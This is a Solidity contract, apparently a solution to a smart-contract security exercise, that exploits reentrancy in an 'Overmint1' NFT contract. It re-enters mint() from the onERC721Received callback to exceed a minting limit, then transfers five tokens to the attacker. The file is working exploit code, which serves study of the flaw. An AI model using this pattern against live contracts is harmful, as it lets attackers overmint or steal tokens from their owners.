// SPDX-License-Identifier: GPL-3.0
pragma solidity 0.8.15;
import "@openzeppelin/contracts/token/ERC721/ERC721.sol";
import {IERC721Receiver} from "@openzeppelin/contracts/token/ERC721/IERC721Receiver.sol";
import "./Overmint1.sol";

contract Overmint1Attacker is IERC721Receiver {
    Overmint1 victim;
    address attacker;

    constructor(address victim_) {
      victim = Overmint1(victim_);
      attacker = msg.sender;
    }

    function attack() external {
        victim.mint();
        for (uint256 i = 1; i <= 5; i++) {
            victim.transferFrom(address(this), attacker, i);
        }
    }

    function onERC721Received(address operator, address from, uint256 tokenId, bytes calldata data)
        external
        returns (bytes4)
    {
        if (victim.totalSupply() < 5) {
            victim.mint();
        }
        return IERC721Receiver.onERC721Received.selector; 
    }
}
